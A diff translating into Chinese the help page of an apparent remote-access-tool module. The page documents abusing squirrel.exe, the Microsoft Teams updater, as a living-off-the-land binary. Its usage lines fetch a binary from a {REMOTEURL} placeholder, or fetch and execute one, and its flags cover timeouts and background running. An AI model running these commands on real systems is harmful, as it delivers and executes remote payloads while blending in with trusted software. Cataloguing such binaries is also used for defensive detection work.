@@ -1,21 +1,21 @@
-ABOUT
+关于
     Binary to update the existing installed Nuget/squirrel package. Part
     of Microsoft Teams installation. LOLBAS covers downloading binary
     and downloading and execute binary.
 
-USAGE:
+用法：
     squirrel.exe --download {REMOTEURL}
     squirrel.exe --update {REMOTEURL}
     squirrel.exe --updateRollback={REMOTEURL}
 
-EXAMPLES:
+示例：
     squirrel.exe --download {REMOTEURL}
     squirrel.exe --update {REMOTEURL}
     squirrel.exe --updateRollback={REMOTEURL}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     squirrel.exe --download {REMOTEURL}
